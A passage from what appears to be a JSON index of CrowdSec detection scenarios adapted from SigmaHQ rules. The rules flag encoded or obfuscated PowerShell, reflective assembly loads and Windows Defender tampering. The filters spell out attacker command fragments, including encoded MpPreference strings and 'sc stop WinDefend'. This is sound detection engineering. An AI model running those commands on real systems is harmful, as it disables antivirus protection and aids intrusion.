'MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA' || evt.Parsed.CommandLine contains 'zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Powershell Base64 Encoded MpPreference Cmdlet\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects base64 encoded \"MpPreference\" PowerShell cmdlet code that tries to modifies or tamper with Windows Defender AV\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_mppreference.yml", "version": "0.2", "versions": {"0.1": {"digest": "09edb415454da69a5d7aa58cbf9e975bb7f58202799e22f5bbaf8b2e6c467e8f"}, "0.2": {"digest": "cdb61fb272c35ee133ede7c31e1b0f6ca0f0b8fdf3d9ac9f0c1b1244f95df3d8"}}}, "sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load\ndescription: |\n  Detects base64 encoded .NET reflective loading of Assembly\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA' || evt.Parsed.CommandLine contains 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA' || evt.Parsed.CommandLine contains 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA' || evt.Parsed.CommandLine contains 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC' || evt.Parsed.CommandLine contains 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp' || evt.Parsed.CommandLine contains 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK' || evt.Parsed.CommandLine contains 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ' || evt.Parsed.CommandLine contains 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA' || evt.Parsed.CommandLine contains 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA' || evt.Parsed.CommandLine contains 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA' || evt.Parsed.CommandLine contains 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA' || evt.Parsed.CommandLine contains 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1027\n   - attack.t1620\n\n  label: \"PowerShell Base64 Encoded Reflective Assembly Load\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects base64 encoded .NET reflective loading of Assembly\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load.yml", "version": "0.2", "versions": {"0.1": {"digest": "d8904c7a1de35cb43d27679a56ee447f691bff4f643796b2b55c2af303057445"}, "0.2": {"digest": "3e2ac470e0493e0f280f2d1fd3cf0b5be6eaa7ae81e791a9034ca9116d60ecad"}}}, "sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load_obfusc": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load_obfusc\ndescription: |\n  Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ' || evt.Parsed.CommandLine contains 'oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA' || evt.Parsed.CommandLine contains '6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA' || evt.Parsed.CommandLine contains 'OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ' || evt.Parsed.CommandLine contains 'oAOgAoACIATABvACIAKwAiAGEAZAAiACkA' || evt.Parsed.CommandLine contains '6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA' || evt.Parsed.CommandLine contains 'OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ' || evt.Parsed.CommandLine contains 'oAOgAoACIATABvAGEAIgArACIAZAAiACkA' || evt.Parsed.CommandLine contains '6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA' || evt.Parsed.CommandLine contains 'OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ' || evt.Parsed.CommandLine contains 'oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA' || evt.Parsed.CommandLine contains '6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA' || evt.Parsed.CommandLine contains 'OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ' || evt.Parsed.CommandLine contains 'oAOgAoACcATABvACcAKwAnAGEAZAAnACkA' || evt.Parsed.CommandLine contains '6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA' || evt.Parsed.CommandLine contains 'OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ' || evt.Parsed.CommandLine contains 'oAOgAoACcATABvAGEAJwArACcAZAAnACkA' || evt.Parsed.CommandLine contains '6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1027\n\n  label: \"Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml", "version": "0.2", "versions": {"0.1": {"digest": "62a294da4013b29a3735df1aa12ac63efb8ee6b2a4e8a42ba96960e6d07793eb"}, "0.2": {"digest": "cd260f8e21f9dd03f9227821048fc25dfe7f5931ff382dd6444241aa8a992e25"}}}, "sigmahq/proc_creation_win_powershell_base64_wmi_classes": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_base64_wmi_classes\ndescription: |\n  Detects calls to base64 encoded WMI class such as \"Win32_ShadowCopy\", \"Win32_ScheduledJob\", etc.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine contains 'VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQ' || evt.Parsed.CommandLine contains 'cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkA' || evt.Parsed.CommandLine contains 'XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5A' || evt.Parsed.CommandLine contains 'V2luMzJfU2hhZG93Y29we' || evt.Parsed.CommandLine contains 'dpbjMyX1NoYWRvd2NvcH' || evt.Parsed.CommandLine contains 'XaW4zMl9TaGFkb3djb3B5' || evt.Parsed.CommandLine contains 'VwBpAG4AMwAyAF8AUwBjAGgAZQBkAHUAbABlAGQASgBvAGIA' || evt.Parsed.CommandLine contains 'cAaQBuADMAMgBfAFMAYwBoAGUAZAB1AGwAZQBkAEoAbwBiA' || evt.Parsed.CommandLine contains 'XAGkAbgAzADIAXwBTAGMAaABlAGQAdQBsAGUAZABKAG8AYg' || evt.Parsed.CommandLine contains 'V2luMzJfU2NoZWR1bGVkSm9i' || evt.Parsed.CommandLine contains 'dpbjMyX1NjaGVkdWxlZEpvY' || evt.Parsed.CommandLine contains 'XaW4zMl9TY2hlZHVsZWRKb2' || evt.Parsed.CommandLine contains 'VwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcw' || evt.Parsed.CommandLine contains 'cAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMA' || evt.Parsed.CommandLine contains 'XAGkAbgAzADIAXwBQAHIAbwBjAGUAcwBzA' || evt.Parsed.CommandLine contains 'V2luMzJfUHJvY2Vzc' || evt.Parsed.CommandLine contains 'dpbjMyX1Byb2Nlc3' || evt.Parsed.CommandLine contains 'XaW4zMl9Qcm9jZXNz' || evt.Parsed.CommandLine contains 'VwBpAG4AMwAyAF8AVQBzAGUAcgBBAGMAYwBvAHUAbgB0A' || evt.Parsed.CommandLine contains 'cAaQBuADMAMgBfAFUAcwBlAHIAQQBjAGMAbwB1AG4AdA' || evt.Parsed.CommandLine contains 'XAGkAbgAzADIAXwBVAHMAZQByAEEAYwBjAG8AdQBuAHQA' || evt.Parsed.CommandLine contains 'V2luMzJfVXNlckFjY291bn' || evt.Parsed.CommandLine contains 'dpbjMyX1VzZXJBY2NvdW50' || evt.Parsed.CommandLine contains 'XaW4zMl9Vc2VyQWNjb3Vud' || evt.Parsed.CommandLine contains 'VwBpAG4AMwAyAF8ATABvAGcAZwBlAGQATwBuAFUAcwBlAHIA' || evt.Parsed.CommandLine contains 'cAaQBuADMAMgBfAEwAbwBnAGcAZQBkAE8AbgBVAHMAZQByA' || evt.Parsed.CommandLine contains 'XAGkAbgAzADIAXwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcg' || evt.Parsed.CommandLine contains 'V2luMzJfTG9nZ2VkT25Vc2Vy' || evt.Parsed.CommandLine contains 'dpbjMyX0xvZ2dlZE9uVXNlc' || evt.Parsed.CommandLine contains 'XaW4zMl9Mb2dnZWRPblVzZX'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n   - attack.t1027\n\n  label: \"PowerShell Base64 Encoded WMI Classes\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects calls to base64 encoded WMI class such as \"Win32_ShadowCopy\", \"Win32_ScheduledJob\", etc.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_base64_wmi_classes.yml", "version": "0.2", "versions": {"0.1": {"digest": "7d0afdee61828ad67c483550d2e6192f6a86b40087c0561e084fc35b40a5d695"}, "0.2": {"digest": "202c5fbaa6c9fbc11501a94b80ba41cc47c2616646ad9a934dd39c5034eed4a6"}}}, "sigmahq/proc_creation_win_powershell_cmdline_reversed_strings": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_cmdline_reversed_strings\ndescription: |\n  Detects the presence of reversed PowerShell commands in the CommandLine. This is often used as a method of obfuscation by attackers\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine contains 'hctac' || evt.Parsed.CommandLine contains 'kaerb' || evt.Parsed.CommandLine contains 'dnammoc' || evt.Parsed.CommandLine contains 'ekovn' || evt.Parsed.CommandLine contains 'eliFd' || evt.Parsed.CommandLine contains 'rahc' || evt.Parsed.CommandLine contains 'etirw' || evt.Parsed.CommandLine contains 'golon' || evt.Parsed.CommandLine contains 'tninon' || evt.Parsed.CommandLine contains 'eddih' || evt.Parsed.CommandLine contains 'tpircS' || evt.Parsed.CommandLine contains 'ssecorp' || evt.Parsed.CommandLine contains 'llehsrewop' || evt.Parsed.CommandLine contains 'esnopser' || evt.Parsed.CommandLine contains 'daolnwod' || evt.Parsed.CommandLine contains 'tneilCbeW' || evt.Parsed.CommandLine contains 'tneilc' || evt.Parsed.CommandLine contains 'ptth' || evt.Parsed.CommandLine contains 'elifotevas' || evt.Parsed.CommandLine contains '46esab' || evt.Parsed.CommandLine contains 'htaPpmeTteG' || evt.Parsed.CommandLine contains 'tcejbO' || evt.Parsed.CommandLine contains 'maerts' || evt.Parsed.CommandLine contains 'hcaerof' || evt.Parsed.CommandLine contains 'retupmoc') && not (evt.Parsed.CommandLine contains ' -EncodedCommand ' || evt.Parsed.CommandLine contains ' -enc '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Potential PowerShell Obfuscation Via Reversed Commands\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the presence of reversed PowerShell commands in the CommandLine. This is often used as a method of obfuscation by attackers\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_cmdline_reversed_strings.yml", "version": "0.2", "versions": {"0.1": {"digest": "f38755eb89fa1e227730be2debd9bf4ec3e87264cf8325887ac3dfbca3f3f56b"}, "0.2": {"digest": "8c16c0d85dac99d88e04534ba6923cc0db21a9e61ecdec4b4f6f074d7dfe1300"}}}, "sigmahq/proc_creation_win_powershell_cmdline_special_characters": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_cmdline_special_characters\ndescription: |\n  Detects the PowerShell command lines with special characters\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine matches '\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+.*\\\\+' || evt.Parsed.CommandLine matches '\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{.*\\\\{' || evt.Parsed.CommandLine matches '\\\\^.*\\\\^.*\\\\^.*\\\\^.*\\\\^' || evt.Parsed.CommandLine matches '`.*`.*`.*`.*`') && not (evt.Parsed.ParentImage == 'C:\\\\Program Files\\\\Amazon\\\\SSM\\\\ssm-document-worker.exe' || evt.Parsed.CommandLine contains 'new EventSource(\"Microsoft.Windows.Sense.Client.Management\"' || evt.Parsed.CommandLine contains 'public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n   - attack.t1059.001\n\n  label: \"Potential PowerShell Command Line Obfuscation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the PowerShell command lines with special characters\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_cmdline_special_characters.yml", "version": "0.2", "versions": {"0.1": {"digest": "f205107011f634f4757ad8ae5e63a6122038cd63b04117a94a58fb9ea2f6dba7"}, "0.2": {"digest": "6e454ae7dcd062e3c4d0c79c4d08500507b293faaa70a2147d1a7732942e781f"}}}, "sigmahq/proc_creation_win_powershell_decrypt_pattern": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_decrypt_pattern\ndescription: |\n  Detects PowerShell commands that decrypt an \".LNK\" \"file to drop the next stage of the malware.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && (evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine contains 'Get-ChildItem ' || evt.Parsed.CommandLine contains 'dir ' || evt.Parsed.CommandLine contains 'gci ' || evt.Parsed.CommandLine contains 'ls ') && (evt.Parsed.CommandLine contains 'Get-Content ' || evt.Parsed.CommandLine contains 'gc ' || evt.Parsed.CommandLine contains 'cat ' || evt.Parsed.CommandLine contains 'type ' || evt.Parsed.CommandLine contains 'ReadAllBytes') && (evt.Parsed.CommandLine contains ' ^| ' && evt.Parsed.CommandLine contains '*.lnk' && evt.Parsed.CommandLine contains '-Recurse' && evt.Parsed.CommandLine contains '-Skip ' || evt.Parsed.CommandLine contains ' -ExpandProperty ' && evt.Parsed.CommandLine contains '*.lnk' && evt.Parsed.CommandLine contains 'WriteAllBytes' && evt.Parsed.CommandLine contains ' .length '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"PowerShell Execution With Potential Decryption Capabilities\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects PowerShell commands that decrypt an \".LNK\" \"file to drop the next stage of the malware.\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_decrypt_pattern.yml", "version": "0.2", "versions": {"0.1": {"digest": "f08e690fd91ce3811363a6c3ba399414d994c86aee191ff68514c892fa538d65"}, "0.2": {"digest": "5ee2f1b83226d25dbc84cb99aa98cde1ed1e7406dc3ab31b5cfab6f62ce03a34"}}}, "sigmahq/proc_creation_win_powershell_defender_disable_feature": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_defender_disable_feature\ndescription: |\n  Detects requests to disable Microsoft Defender features using PowerShell commands\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'Add-MpPreference ' || evt.Parsed.CommandLine contains 'Set-MpPreference ') && (evt.Parsed.CommandLine contains 'DisableArchiveScanning ' || evt.Parsed.CommandLine contains 'DisableRealtimeMonitoring ' || evt.Parsed.CommandLine contains 'DisableIOAVProtection ' || evt.Parsed.CommandLine contains 'DisableBehaviorMonitoring ' || evt.Parsed.CommandLine contains 'DisableBlockAtFirstSeen ' || evt.Parsed.CommandLine contains 'DisableCatchupFullScan ' || evt.Parsed.CommandLine contains 'DisableCatchupQuickScan ') && (evt.Parsed.CommandLine contains '$true' || evt.Parsed.CommandLine contains ' 1 ') || evt.Parsed.CommandLine contains 'ZGlzYWJsZWFyY2hpdmVzY2FubmluZy' || evt.Parsed.CommandLine contains 'Rpc2FibGVhcmNoaXZlc2Nhbm5pbmcg' || evt.Parsed.CommandLine contains 'kaXNhYmxlYXJjaGl2ZXNjYW5uaW5nI' || evt.Parsed.CommandLine contains 'RGlzYWJsZUFyY2hpdmVTY2FubmluZy' || evt.Parsed.CommandLine contains 'Rpc2FibGVBcmNoaXZlU2Nhbm5pbmcg' || evt.Parsed.CommandLine contains 'EaXNhYmxlQXJjaGl2ZVNjYW5uaW5nI' || evt.Parsed.CommandLine contains 'ZGlzYWJsZWJlaGF2aW9ybW9uaXRvcmluZy' || evt.Parsed.CommandLine contains 'Rpc2FibGViZWhhdmlvcm1vbml0b3Jpbmcg' || evt.Parsed.CommandLine contains 'kaXNhYmxlYmVoYXZpb3Jtb25pdG9yaW5nI' || evt.Parsed.CommandLine contains 'RGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZy' || evt.Parsed.CommandLine contains 'Rpc2FibGVCZWhhdmlvck1vbml0b3Jpbmcg' || evt.Parsed.CommandLine contains 'EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nI' || evt.Parsed.CommandLine contains 'ZGlzYWJsZWJsb2NrYXRmaXJzdHNlZW4g' || evt.Parsed.CommandLine contains 'Rpc2FibGVibG9ja2F0Zmlyc3RzZWVuI' || evt.Parsed.CommandLine contains 'kaXNhYmxlYmxvY2thdGZpcnN0c2Vlbi' || evt.Parsed.CommandLine contains 'RGlzYWJsZUJsb2NrQXRGaXJzdFNlZW4g' || evt.Parsed.CommandLine contains 'Rpc2FibGVCbG9ja0F0Rmlyc3RTZWVuI' || evt.Parsed.CommandLine contains 'EaXNhYmxlQmxvY2tBdEZpcnN0U2Vlbi' || evt.Parsed.CommandLine contains 'ZGlzYWJsZWNhdGNodXBmdWxsc2Nhbi' || evt.Parsed.CommandLine contains 'Rpc2FibGVjYXRjaHVwZnVsbHNjYW4g' || evt.Parsed.CommandLine contains 'kaXNhYmxlY2F0Y2h1cGZ1bGxzY2FuI' || evt.Parsed.CommandLine contains 'RGlzYWJsZUNhdGNodXBGdWxsU2Nhbi' || evt.Parsed.CommandLine contains 'Rpc2FibGVDYXRjaHVwRnVsbFNjYW4g' || evt.Parsed.CommandLine contains 'EaXNhYmxlQ2F0Y2h1cEZ1bGxTY2FuI' || evt.Parsed.CommandLine contains 'ZGlzYWJsZWNhdGNodXBxdWlja3NjYW4g' || evt.Parsed.CommandLine contains 'Rpc2FibGVjYXRjaHVwcXVpY2tzY2FuI' || evt.Parsed.CommandLine contains 'kaXNhYmxlY2F0Y2h1cHF1aWNrc2Nhbi' || evt.Parsed.CommandLine contains 'RGlzYWJsZUNhdGNodXBRdWlja1NjYW4g' || evt.Parsed.CommandLine contains 'Rpc2FibGVDYXRjaHVwUXVpY2tTY2FuI' || evt.Parsed.CommandLine contains 'EaXNhYmxlQ2F0Y2h1cFF1aWNrU2Nhbi' || evt.Parsed.CommandLine contains 'ZGlzYWJsZWlvYXZwcm90ZWN0aW9uI' || evt.Parsed.CommandLine contains 'Rpc2FibGVpb2F2cHJvdGVjdGlvbi' || evt.Parsed.CommandLine contains 'kaXNhYmxlaW9hdnByb3RlY3Rpb24g' || evt.Parsed.CommandLine contains 'RGlzYWJsZUlPQVZQcm90ZWN0aW9uI' || evt.Parsed.CommandLine contains 'Rpc2FibGVJT0FWUHJvdGVjdGlvbi' || evt.Parsed.CommandLine contains 'EaXNhYmxlSU9BVlByb3RlY3Rpb24g' || evt.Parsed.CommandLine contains 'ZGlzYWJsZXJlYWx0aW1lbW9uaXRvcmluZy' || evt.Parsed.CommandLine contains 'Rpc2FibGVyZWFsdGltZW1vbml0b3Jpbmcg' || evt.Parsed.CommandLine contains 'kaXNhYmxlcmVhbHRpbWVtb25pdG9yaW5nI' || evt.Parsed.CommandLine contains 'RGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZy' || evt.Parsed.CommandLine contains 'Rpc2FibGVSZWFsdGltZU1vbml0b3Jpbmcg' || evt.Parsed.CommandLine contains 'EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nI' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA' || evt.Parsed.CommandLine contains 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA' || evt.Parsed.CommandLine contains 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA' || evt.Parsed.CommandLine contains 'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA' || evt.Parsed.CommandLine contains 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA' || evt.Parsed.CommandLine contains 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA' || evt.Parsed.CommandLine contains 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA' || evt.Parsed.CommandLine contains 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA' || evt.Parsed.CommandLine contains 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA' || evt.Parsed.CommandLine contains 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA' || evt.Parsed.CommandLine contains 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA' || evt.Parsed.CommandLine contains 'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA' || evt.Parsed.CommandLine contains 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA' || evt.Parsed.CommandLine contains 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA' || evt.Parsed.CommandLine contains 'RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Powershell Defender Disable Scan Feature\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects requests to disable Microsoft Defender features using PowerShell commands\n", "path": "scenarios/sigmahq/proc_creation_win_powershell_defender_disable_feature.yml", "version": "0.2", "versions": {"0.1": {"digest": "e22f59586ac3d7e6b3d168bd8d72e84fd0acfa98e23eee30b883f2f0e9d463cb"}, "0.2": {"digest": "c218895468689a796fd0700e71bd49f60152d074a1ae3ba36dfb742cf767f6b8"}}}, "sigmahq/proc_creation_win_powershell_disable_defender_av_security_monitoring": {"content": "type: trigger\nname: sigmahq/proc_creation_win_powershell_disable_defender_av_security_monitoring\ndescription: |\n  Detects attackers attempting to disable Windows Defender using Powershell\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll']) && (evt.Parsed.CommandLine contains '-DisableBehaviorMonitoring $true' || evt.Parsed.CommandLine contains '-DisableRuntimeMonitoring $true') || (evt.Parsed.Image endsWith '\\\\sc.exe' || evt.Parsed.OriginalFileName == 'sc.exe') && (evt.Parsed.CommandLine contains 'stop' && evt.Parsed.CommandLine contains 'WinDefend' || evt.Parsed.CommandLine contains 'delete' && evt.Parsed.CommandLine contains 'WinDefend' || evt.Parsed.CommandLine contains 'config' && evt.Parsed.CommandLine contains 'WinDefend' && evt.Parsed.CommandLine contains 'start=disabled'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Disable Windows Defender AV 